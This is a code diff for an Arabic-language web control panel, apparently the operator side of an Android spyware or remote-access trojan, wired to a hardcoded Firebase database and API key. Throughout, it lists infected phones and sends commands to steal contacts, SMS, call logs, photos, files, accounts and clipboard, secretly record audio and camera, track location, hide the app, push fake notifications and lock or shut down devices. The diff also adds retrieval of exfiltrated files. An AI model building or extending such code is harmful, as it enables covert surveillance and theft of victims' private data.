@@ -32,12 +32,18 @@
         .data-area{background:#0d0d1a;padding:10px;border-radius:10px;margin-top:10px;max-height:300px;overflow-y:auto;font-size:12px;color:#fff;border:1px solid #333;display:none}
         .data-area.show{display:block}
         .download-btn{background:#22c55e;color:#000;padding:8px 15px;border:none;border-radius:8px;cursor:pointer;margin-top:8px;font-weight:bold}
+        .open-btn{background:#3b82f6;color:#fff;padding:8px 15px;border:none;border-radius:8px;cursor:pointer;margin-top:8px;font-weight:bold;margin-right:8px}
         .location-link{color:#3b82f6;text-decoration:underline;cursor:pointer}
+        .page{display:none;background:#1a1a2e;padding:15px;border-radius:15px;border:1px solid #333}
+        .page.active{display:block}
+        .back-btn{background:#666;color:#fff;border:none;padding:8px 15px;border-radius:8px;cursor:pointer;margin-bottom:15px}
+        .file-info{color:#22c55e;font-size:12px;margin-top:5px}
     </style>
 </head>
 <body>
     <div class="header"><h1>🔱 بلاك - لوحة التحكم</h1></div>
 
+    <!-- صفحة الإعدادات -->
     <div class="setup" id="setupSection">
         <h3>⚙️ إعدادات Firebase</h3>
         <input type="text" id="apiKey" placeholder="apiKey" value="AIzaSyDBizqAKWSwGsicO6eRua-5x_8VQLFKTIc">
@@ -45,58 +51,72 @@
         <button onclick="initFirebase()">🚀 الاتصال بـ Firebase</button>
     </div>
 
-    <div id="mainSection" style="display:none;">
-        <div id="selectedDisplay" class="selected-device">⚠️ لم يتم اختيار جهاز</div>
+    <!-- الصفحة الرئيسية (الأجهزة) -->
+    <div id="mainPage" class="page active">
         <div class="device-list"><h3>📱 الأجهزة المتصلة</h3><div id="devices"></div></div>
-
-        <!-- قسم أوامر الملفات -->
-        <div class="section-title">📂 أوامر جلب الملفات</div>
-        <div class="controls-grid">
-            <div class="ctrl-btn file-btn" onclick="sendCmd('get_contacts')"><span class="icon">📇</span>جهات الاتصال</div>
-            <div class="ctrl-btn file-btn" onclick="sendCmd('get_sms')"><span class="icon">💬</span>الرسائل</div>
-            <div class="ctrl-btn file-btn" onclick="sendCmd('get_calllogs')"><span class="icon">📞</span>سجل المكالمات</div>
-            <div class="ctrl-btn file-btn" onclick="sendCmd('get_photos')"><span class="icon">🖼</span>الصور</div>
-            <div class="ctrl-btn file-btn" onclick="sendCmd('get_videos')"><span class="icon">🎬</span>الفيديوهات</div>
-            <div class="ctrl-btn file-btn" onclick="sendCmd('get_files')"><span class="icon">📦</span>جميع الملفات</div>
-            <div class="ctrl-btn file-btn" onclick="sendCmd('get_apps')"><span class="icon">📱</span>التطبيقات</div>
-            <div class="ctrl-btn file-btn" onclick="sendCmd('get_clipboard')"><span class="icon">📋</span>الحافظة</div>
-            <div class="ctrl-btn file-btn" onclick="sendCmd('get_accounts')"><span class="icon">👤</span>الحسابات</div>
-            <div class="ctrl-btn file-btn" onclick="sendCmd('get_device')"><span class="icon">ℹ️</span>معلومات الجهاز</div>
-            <div class="ctrl-btn file-btn" onclick="sendCmd('get_network')"><span class="icon">📡</span>معلومات الشبكة</div>
-            <div class="ctrl-btn file-btn" onclick="sendCmd('get_imei')"><span class="icon">📟</span>IMEI</div>
-            <div class="ctrl-btn file-btn" onclick="sendCmd('get_phone')"><span class="icon">📞</span>رقم الهاتف</div>
-            <div class="ctrl-btn file-btn" onclick="sendCmd('get_sim')"><span class="icon">📡</span>معلومات SIM</div>
-            <div class="ctrl-btn file-btn" onclick="sendCmd('get_wifi')"><span class="icon">📶</span>الواي فاي</div>
-            <div class="ctrl-btn file-btn" onclick="sendCmd('get_battery')"><span class="icon">🔋</span>البطارية</div>
-            <div class="ctrl-btn file-btn" onclick="sendCmd('get_ip')"><span class="icon">🌐</span>IP العام</div>
-        </div>
-
-        <!-- قسم أوامر التحكم -->
-        <div class="section-title">🎯 أوامر التحكم المباشر</div>
-        <div class="controls-grid">
-            <div class="ctrl-btn control-btn" onclick="sendCmd('get_location')"><span class="icon">📍</span>الموقع</div>
-            <div class="ctrl-btn control-btn" onclick="sendCmd('start_record')"><span class="icon">🎤</span>تسجيل صوت</div>
-            <div class="ctrl-btn control-btn" onclick="sendCmd('stop_record')"><span class="icon">⏹</span>إيقاف التسجيل</div>
-            <div class="ctrl-btn control-btn" onclick="sendCmd('take_photo')"><span class="icon">📸</span>تصوير خلفي</div>
-            <div class="ctrl-btn control-btn" onclick="sendCmd('take_photo_front')"><span class="icon">🤳</span>تصوير أمامي</div>
-            <div class="ctrl-btn control-btn" onclick="sendCmd('flash_on')"><span class="icon">🔦</span>كشاف ON</div>
-            <div class="ctrl-btn control-btn" onclick="sendCmd('flash_off')"><span class="icon">🔦</span>كشاف OFF</div>
-            <div class="ctrl-btn control-btn" onclick="sendCmd('start_location_track')"><span class="icon">📍</span>تتبع الموقع</div>
-            <div class="ctrl-btn control-btn" onclick="sendCmd('stop_location_track')"><span class="icon">🛑</span>إيقاف التتبع</div>
-            <div class="ctrl-btn danger-btn" onclick="sendCmd('hide_app')"><span class="icon">👁‍🗨</span>إخفاء</div>
-            <div class="ctrl-btn danger-btn" onclick="sendCmd('show_app')"><span class="icon">👁</span>إظهار</div>
-            <div class="ctrl-btn danger-btn" onclick="sendCmd('fake_notif')"><span class="icon">🔔</span>إشعار وهمي</div>
-            <div class="ctrl-btn danger-btn" onclick="sendCmd('lock_device')"><span class="icon">🔒</span>قفل الجهاز</div>
-            <div class="ctrl-btn danger-btn" onclick="sendCmd('reboot')"><span class="icon">🔄</span>إعادة تشغيل</div>
-            <div class="ctrl-btn danger-btn" onclick="sendCmd('shutdown')"><span class="icon">⏻</span>إيقاف تشغيل</div>
-        </div>
-
-        <div class="data-area" id="dataArea">
-            <div id="dataContent"></div>
-            <button class="download-btn" id="downloadBtn" style="display:none;" onclick="downloadData()">📥 تحميل الملف</button>
-        </div>
-        <div class="log" id="log">[+] النظام جاهز</div>
     </div>
+
+    <!-- صفحة الأوامر -->
+    <div id="commandsPage" class="page">
+        <button class="back-btn" onclick="showPage('mainPage')">🔙 العودة</button>
+        <div id="selectedDisplay" class="selected-device">🎯 الجهاز المحدد: ...</div>
+
+        <div class="section-title">📂 أوامر جلب الملفات</div>
+        <div class="controls-grid" id="fileCommands">
+            <div class="ctrl-btn file-btn" onclick="execCmd('get_contacts')"><span class="icon">📇</span>جهات الاتصال</div>
+            <div class="ctrl-btn file-btn" onclick="execCmd('get_sms')"><span class="icon">💬</span>الرسائل</div>
+            <div class="ctrl-btn file-btn" onclick="execCmd('get_calllogs')"><span class="icon">📞</span>سجل المكالمات</div>
+            <div class="ctrl-btn file-btn" onclick="execCmd('get_photos')"><span class="icon">🖼</span>الصور</div>
+            <div class="ctrl-btn file-btn" onclick="execCmd('get_videos')"><span class="icon">🎬</span>الفيديوهات</div>
+            <div class="ctrl-btn file-btn" onclick="execCmd('get_files')"><span class="icon">📦</span>جميع الملفات</div>
+            <div class="ctrl-btn file-btn" onclick="execCmd('get_apps')"><span class="icon">📱</span>التطبيقات</div>
+            <div class="ctrl-btn file-btn" onclick="execCmd('get_clipboard')"><span class="icon">📋</span>الحافظة</div>
+            <div class="ctrl-btn file-btn" onclick="execCmd('get_accounts')"><span class="icon">👤</span>الحسابات</div>
+            <div class="ctrl-btn file-btn" onclick="execCmd('get_device')"><span class="icon">ℹ️</span>معلومات الجهاز</div>
+            <div class="ctrl-btn file-btn" onclick="execCmd('get_network')"><span class="icon">📡</span>معلومات الشبكة</div>
+            <div class="ctrl-btn file-btn" onclick="execCmd('get_imei')"><span class="icon">📟</span>IMEI</div>
+            <div class="ctrl-btn file-btn" onclick="execCmd('get_phone')"><span class="icon">📞</span>رقم الهاتف</div>
+            <div class="ctrl-btn file-btn" onclick="execCmd('get_sim')"><span class="icon">📡</span>معلومات SIM</div>
+            <div class="ctrl-btn file-btn" onclick="execCmd('get_wifi')"><span class="icon">📶</span>الواي فاي</div>
+            <div class="ctrl-btn file-btn" onclick="execCmd('get_battery')"><span class="icon">🔋</span>البطارية</div>
+            <div class="ctrl-btn file-btn" onclick="execCmd('get_ip')"><span class="icon">🌐</span>IP العام</div>
+        </div>
+
+        <div class="section-title">🎯 أوامر التحكم المباشر</div>
+        <div class="controls-grid" id="controlCommands">
+            <div class="ctrl-btn control-btn" onclick="execCmd('get_location')"><span class="icon">📍</span>الموقع</div>
+            <div class="ctrl-btn control-btn" onclick="execCmd('start_record')"><span class="icon">🎤</span>تسجيل صوت</div>
+            <div class="ctrl-btn control-btn" onclick="execCmd('stop_record')"><span class="icon">⏹</span>إيقاف التسجيل</div>
+            <div class="ctrl-btn control-btn" onclick="execCmd('take_photo')"><span class="icon">📸</span>تصوير خلفي</div>
+            <div class="ctrl-btn control-btn" onclick="execCmd('take_photo_front')"><span class="icon">🤳</span>تصوير أمامي</div>
+            <div class="ctrl-btn control-btn" onclick="execCmd('flash_on')"><span class="icon">🔦</span>كشاف ON</div>
+            <div class="ctrl-btn control-btn" onclick="execCmd('flash_off')"><span class="icon">🔦</span>كشاف OFF</div>
+            <div class="ctrl-btn control-btn" onclick="execCmd('start_location_track')"><span class="icon">📍</span>تتبع الموقع</div>
+            <div class="ctrl-btn control-btn" onclick="execCmd('stop_location_track')"><span class="icon">🛑</span>إيقاف التتبع</div>
+            <div class="ctrl-btn danger-btn" onclick="execCmd('hide_app')"><span class="icon">👁‍🗨</span>إخفاء</div>
+            <div class="ctrl-btn danger-btn" onclick="execCmd('show_app')"><span class="icon">👁</span>إظهار</div>
+            <div class="ctrl-btn danger-btn" onclick="execCmd('fake_notif')"><span class="icon">🔔</span>إشعار وهمي</div>
+            <div class="ctrl-btn danger-btn" onclick="execCmd('lock_device')"><span class="icon">🔒</span>قفل الجهاز</div>
+            <div class="ctrl-btn danger-btn" onclick="execCmd('reboot')"><span class="icon">🔄</span>إعادة تشغيل</div>
+            <div class="ctrl-btn danger-btn" onclick="execCmd('shutdown')"><span class="icon">⏻</span>إيقاف تشغيل</div>
+        </div>
+    </div>
+
+    <!-- صفحة النتيجة (خاصة بكل أمر) -->
+    <div id="resultPage" class="page">
+        <button class="back-btn" onclick="showPage('commandsPage')">🔙 العودة</button>
+        <h3 id="resultTitle" style="margin-bottom:10px;">📄 النتيجة</h3>
+        <div id="resultContent" style="background:#0d0d1a;padding:10px;border-radius:10px;max-height:300px;overflow-y:auto;font-size:12px;color:#fff;border:1px solid #333;">
+            ⏳ جاري التنفيذ...
+        </div>
+        <div id="resultActions" style="margin-top:10px;display:none;">
+            <button class="download-btn" id="resultDownloadBtn" onclick="downloadResult()">📥 تحميل الملف</button>
+            <button class="open-btn" id="resultOpenBtn" onclick="openResult()">📂 فتح الملف</button>
+        </div>
+        <div id="resultPath" style="color:#666;font-size:11px;margin-top:5px;"></div>
+    </div>
+
+    <div class="log" id="log">[+] النظام جاهز</div>
 
     <script>
         let selectedDevice = null;
@@ -106,12 +126,18 @@
         let dataListener = null;
         let currentData = null;
         let currentFileName = 'data.txt';
+        let currentFilePath = '';
 
         document.getElementById('apiKey').value = localStorage.getItem('fb_apiKey') || 'AIzaSyDBizqAKWSwGsicO6eRua-5x_8VQLFKTIc';
         document.getElementById('databaseURL').value = localStorage.getItem('fb_databaseURL') || 'https://black-cock-4929d-default-rtdb.firebaseio.com/';
 
         document.getElementById('apiKey').onchange = () => localStorage.setItem('fb_apiKey', document.getElementById('apiKey').value);
         document.getElementById('databaseURL').onchange = () => localStorage.setItem('fb_databaseURL', document.getElementById('databaseURL').value);
+
+        function showPage(pageId) {
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            document.getElementById(pageId).classList.add('active');
+        }
 
         function initFirebase() {
             const apiKey = document.getElementById('apiKey').value.trim();
@@ -123,7 +149,7 @@
                 database = firebase.database();
                 commandsRef = database.ref('commands');
                 document.getElementById('setupSection').style.display = 'none';
-                document.getElementById('mainSection').style.display = 'block';
+                showPage('mainPage');
                 log('✅ تم الاتصال بـ Firebase');
                 database.ref('devices').on('value', snapshot => {
                     const data = snapshot.val();
@@ -132,10 +158,10 @@
                         for (let id in data) {
                             try {
                                 const info = JSON.parse(data[id]);
-                                devices[id] = info;
-                            } catch(e) {
-                                devices[id] = { device_name: id };
-                            }
+                                if (info && info.device_name) {
+                                    devices[id] = info;
+                                }
+                            } catch(e) {}
                         }
                     }
                     updateDevices();
@@ -144,27 +170,65 @@
             } catch(e) { log('❌ خطأ في Firebase: ' + e.message); }
         }
 
-        function sendCmd(cmd) {
+        function updateDevices() {
+            const container = document.getElementById('devices');
+            container.innerHTML = '';
+            if (Object.keys(devices).length === 0) {
+                container.innerHTML = '<div style="text-align:center;padding:20px;color:#666;">⏳ انتظار تسجيل جهاز...</div>';
+                return;
+            }
+            for (let id in devices) {
+                const dev = devices[id];
+                const div = document.createElement('div');
+                div.className = 'device-item';
+                const name = dev.device_name || dev.model || id;
+                div.innerHTML = '<span>📱 ' + name + '</span><span class="status">🟢 متصل</span>';
+                div.onclick = () => {
+                    selectedDevice = id;
+                    document.getElementById('selectedDisplay').textContent = '🎯 الجهاز المحدد: ' + name;
+                    showPage('commandsPage');
+                    if (dataListener) {
+                        database.ref('devices').child(id).child('data').off('value', dataListener);
+                    }
+                    dataListener = database.ref('devices').child(id).child('data').on('value', snapshot => {
+                        const data = snapshot.val();
+                        if (data) {
+                            // تخزين البيانات للاستخدام في صفحة النتيجة
+                            currentData = data;
+                            // إظهار صفحة النتيجة تلقائياً
+                            showResult(data);
+                            log('📥 بيانات واردة من ' + name);
+                        }
+                    });
+                };
+                container.appendChild(div);
+            }
+        }
+
+        function execCmd(cmd) {
             if (!selectedDevice) { log('⚠️ اختر جهازاً أولاً'); return; }
             if (!commandsRef) { log('❌ Firebase غير جاهز'); return; }
             log('📤 أمر مرسل: ' + cmd + ' → ' + selectedDevice);
             commandsRef.child(selectedDevice).set(cmd);
-            showData('⏳ جاري تنفيذ الأمر: ' + cmd + '...', 'info.txt');
+            // إظهار صفحة النتيجة مع رسالة انتظار
+            document.getElementById('resultTitle').textContent = '⏳ جاري تنفيذ: ' + cmd;
+            document.getElementById('resultContent').textContent = '⏳ جاري تنفيذ الأمر...';
+            document.getElementById('resultActions').style.display = 'none';
+            document.getElementById('resultPath').textContent = '';
+            showPage('resultPage');
         }
 
-        function log(msg) {
-            const el = document.getElementById('log');
-            const time = new Date().toLocaleTimeString('ar-SA');
-            el.innerHTML += '\n<span class="time">[' + time + ']</span> ' + msg;
-            el.scrollTop = el.scrollHeight;
-        }
+        function showResult(data) {
+            const title = document.getElementById('resultTitle');
+            const content = document.getElementById('resultContent');
+            const actions = document.getElementById('resultActions');
+            const pathEl = document.getElementById('resultPath');
+            const downloadBtn = document.getElementById('resultDownloadBtn');
+            const openBtn = document.getElementById('resultOpenBtn');
 
-        function showData(data, filename = 'data.txt') {
-            const area = document.getElementById('dataArea');
-            const content = document.getElementById('dataContent');
-            const btn = document.getElementById('downloadBtn');
-            currentData = data;
-            currentFileName = filename;
+            title.textContent = '📄 النتيجة';
+            actions.style.display = 'none';
+            pathEl.textContent = '';
 
             // إذا كان الموقع
             if (data.includes('LOCATION') && data.includes(',')) {
@@ -177,8 +241,6 @@
                             const lon = coords[1];
                             const url = `https://www.google.com/maps?q=${lat},${lon}`;
                             content.innerHTML = `<a href="${url}" target="_blank" class="location-link">📍 فتح الموقع على الخريطة</a><br><br>${data}`;
-                            btn.style.display = 'none';
-                            area.classList.add('show');
                             return;
                         }
                     }
@@ -190,6 +252,8 @@
                 try {
                     const json = JSON.parse(data);
                     if (json.data && json.name) {
+                        currentFileName = json.name;
+                        currentFilePath = json.path || 'غير معروف';
                         const binary = atob(json.data);
                         const bytes = new Uint8Array(binary.length);
                         for (let i = 0; i < binary.length; i++) {
@@ -197,9 +261,25 @@
                         }
                         const blob = new Blob([bytes]);
                         const url = URL.createObjectURL(blob);
-                        content.innerHTML = `<a href="${url}" download="${json.name}" style="color:#22c55e;">📥 تحميل ${json.name}</a><br><br>${json.caption || ''}`;
-                        btn.style.display = 'none';
-                        area.classList.add('show');
+                        content.innerHTML = `<div style="color:#22c55e;">✅ تم استلام الملف: ${json.name}</div><div style="color:#aaa;font-size:12px;">${json.caption || ''}</div>`;
+                        actions.style.display = 'block';
+                        pathEl.textContent = '📂 مسار الملف: ' + currentFilePath;
+                        downloadBtn.onclick = () => {
+                            const a = document.createElement('a');
+                            a.href = url;
+                            a.download = json.name;
+                            document.body.appendChild(a);
+                            a.click();
+                            document.body.removeChild(a);
+                            log('📥 تم تحميل الملف: ' + json.name);
+                        };
+                        openBtn.onclick = () => {
+                            const a = document.createElement('a');
+                            a.href = url;
+                            a.target = '_blank';
+                            a.click();
+                            log('📂 تم فتح الملف: ' + json.name);
+                        };
                         return;
                     }
                 } catch(e) {}
@@ -207,59 +287,22 @@
 
             // نص عادي
             content.textContent = data;
-            btn.style.display = 'block';
-            area.classList.add('show');
+            actions.style.display = 'none';
         }
 
-        function downloadData() {
-            if (!currentData) return;
-            const blob = new Blob([currentData], {type: 'text/plain;charset=utf-8'});
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = currentFileName;
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-            URL.revokeObjectURL(url);
-            log('📥 تم تحميل الملف: ' + currentFileName);
+        function downloadResult() {
+            // يتم التعامل معها داخل showResult
         }
 
-        function updateDevices() {
-            const container = document.getElementById('devices');
-            container.innerHTML = '';
-            for (let id in devices) {
-                const dev = devices[id];
-                const div = document.createElement('div');
-                div.className = 'device-item' + (selectedDevice === id ? ' active' : '');
-                const name = dev.device_name || dev.model || id;
-                div.innerHTML = '<span>📱 ' + name + '</span><span class="status">🟢 متصل</span>';
-                div.onclick = () => {
-                    selectedDevice = id;
-                    document.getElementById('selectedDisplay').textContent = '🎯 الجهاز المحدد: ' + name;
-                    updateDevices();
-                    if (dataListener) {
-                        database.ref('devices').child(id).child('data').off('value', dataListener);
-                    }
-                    dataListener = database.ref('devices').child(id).child('data').on('value', snapshot => {
-                        const data = snapshot.val();
-                        if (data) {
-                            let filename = 'data.txt';
-                            if (data.includes('CONTACTS')) filename = 'contacts.txt';
-                            else if (data.includes('SMS')) filename = 'sms.txt';
-                            else if (data.includes('CALL')) filename = 'call_log.txt';
-                            else if (data.includes('RECORD')) filename = 'recording.mp3';
-                            else if (data.includes('PHOTO')) filename = 'photo.jpg';
-                            showData(data, filename);
-                            log('📥 بيانات واردة من ' + name);
-                        }
-                    });
-                };
-                container.appendChild(div);
-            }
-            if (Object.keys(devices).length === 0) {
-                container.innerHTML = '<div style="text-align:center;padding:20px;color:#666;">⏳ انتظار تسجيل جهاز...</div>';
-            }
+        function openResult() {
+            // يتم التعامل معها داخل showResult
+        }
+
+        function log(msg) {
+            const el = document.getElementById('log');
+            const time = new Date().toLocaleTimeString('ar-SA');
+            el.innerHTML += '\n<span class="time">[' + time + ']</span> ' + msg;
+            el.scrollTop = el.scrollHeight;
         }
 
         if (localStorage.getItem('fb_apiKey') && localStorage.getItem('fb_databaseURL')) {
